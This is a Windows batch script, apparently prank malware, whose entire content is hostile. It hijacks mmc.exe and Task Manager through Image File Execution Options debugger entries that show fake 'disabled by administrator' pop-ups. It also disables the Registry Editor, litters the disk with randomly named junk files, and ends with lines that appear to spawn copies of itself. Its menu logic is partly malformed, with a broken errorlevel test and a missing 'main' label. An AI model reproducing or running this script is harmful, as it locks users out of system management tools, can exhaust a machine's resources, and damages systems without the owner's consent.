@echo off
echo Did you run this as administrator?
choice /c YN /m "[Y]es or [N]o?"
if errorlevel equ 1 goto main
if errorlevel equ 2 exit
echo x=msgbox^("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_mmc.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
echo x=msgbox^("The task manager been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_taskmgr.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d C:\Windows\error_taskmgr.vbs /t REG_SZ /f > nul
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
mkdir C:\%random%
echo spamspamspamspamspamspamspam > %random%\%random%
echo spamspamspamspamspamspamspam > %random%
start explorer.exe
start notepad.exe
start %1
%1 | %1
